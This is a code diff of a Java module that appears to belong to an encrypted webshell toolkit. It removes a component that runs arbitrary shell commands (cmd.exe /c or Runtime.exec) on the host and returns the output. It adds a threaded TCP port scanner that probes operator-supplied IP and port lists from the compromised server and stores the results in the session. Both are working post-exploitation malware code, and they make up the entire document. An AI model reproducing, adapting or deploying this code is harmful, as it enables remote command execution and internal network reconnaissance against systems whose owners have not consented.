@@ -7,18 +7,28 @@ import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.nio.charset.Charset;
+import java.net.InetSocketAddress;
+import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
+import java.util.Iterator;
+import java.util.List;
 import java.util.Map;
 
-public class Cmd {
-    public static String cmd;
+public class Scan implements Runnable {
+    public static String ipList;
+    public static String portList;
+    public static String taskID;
     private ServletRequest Request;
     private ServletResponse Response;
     private HttpSession Session;
+
+    public Scan(HttpSession session) {
+        this.Session = session;
+    }
+
+    public Scan() {
+    }
 
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
@@ -28,7 +38,8 @@ public class Cmd {
         page.getResponse().setCharacterEncoding("UTF-8");
         Map<String, String> result = new HashMap<>();
         try {
-            result.put("msg", RunCMD(cmd));
+            new Thread(new Scan(this.Session)).start();
+            result.put("msg", "扫描任务提交成功");
             result.put("status", "success");
             try {
                 ServletOutputStream so = this.Response.getOutputStream();
@@ -41,7 +52,7 @@ public class Cmd {
             }
         } catch (Exception e2) {
             result.put("msg", e2.getMessage());
-            result.put("status", "success");
+            result.put("status", "fail");
             try {
                 ServletOutputStream so2 = this.Response.getOutputStream();
                 so2.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
@@ -66,26 +77,31 @@ public class Cmd {
         return true;
     }
 
-    private String RunCMD(String cmd2) throws Exception {
-        Process p;
-        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
-        if (cmd2 == null || cmd2.length() <= 0) {
-            return "";
+    public void run() {
+        try {
+            String[] ips = ipList.split(",");
+            String[] ports = portList.split(",");
+            Map<String, String> sessionObj = new HashMap<>();
+            Map<String, String> scanResult = new HashMap<>();
+            sessionObj.put("running", "true");
+            for (String ip : ips) {
+                for (String port : ports) {
+                    try {
+                        Socket socket = new Socket();
+                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
+                        socket.close();
+                        scanResult.put(ip + ":" + port, "open");
+                    } catch (Exception e) {
+                        scanResult.put(ip + ":" + port, "closed");
+                    }
+                    sessionObj.put("result", buildJson(scanResult, false));
+                    this.Session.setAttribute(taskID, sessionObj);
+                }
+            }
+            sessionObj.put("running", "false");
+        } catch (Exception e2) {
+            e2.printStackTrace();
         }
-        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd2});
-        } else {
-            p = Runtime.getRuntime().exec(cmd2);
-        }
-        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
-        String disr = br.readLine();
-        String result = "";
-        while (disr != null) {
-            String result2 = result + disr + "\n";
-            disr = br.readLine();
-            result = result2;
-        }
-        return new String(result.getBytes(osCharset));
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
@@ -121,6 +137,20 @@ public class Cmd {
             sb.setLength(sb.length() - 1);
         }
         sb.append("}");
+        return sb.toString();
+    }
+
+    private String buildJsonArray(List<Map<String, String>> entityList, boolean encode) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        sb.append("[");
+        Iterator<Map<String, String>> it = entityList.iterator();
+        while (it.hasNext()) {
+            sb.append(buildJson(it.next(), encode) + ",");
+        }
+        if (sb.toString().endsWith(",")) {
+            sb.setLength(sb.length() - 1);
+        }
+        sb.append("]");
         return sb.toString();
     }
 }
